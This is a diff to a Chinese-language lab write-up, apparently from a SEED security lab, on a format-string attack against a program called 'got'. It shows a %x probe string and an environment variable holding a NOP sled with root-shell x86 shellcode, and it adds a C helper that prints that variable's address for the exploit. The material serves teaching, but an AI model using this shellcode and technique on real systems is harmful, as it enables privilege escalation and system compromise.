@@ -202,7 +202,18 @@ got %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
 export EGG=$(python -c "print '\x90'*1000 + '\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
 ```
 
-编写 att.c 文件，并在 seed 用户下编译，运行，用以输出环境变量的地址。保存为att.c文件，并编译为att文件，是为了和got文件名长度相同，也必须相同，否则地址会有偏差。
+编写 att.c 文件
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+int main(void)
+{
+    printf("EGG address: %p ", getenv("EGG"));
+}
+```
+
+并在 seed 用户下编译，运行，用以输出环境变量的地址。保存为att.c文件，并编译为att文件，是为了和got文件名长度相同，也必须相同，否则地址会有偏差。
 
 ```bash
 gcc att.c -o att
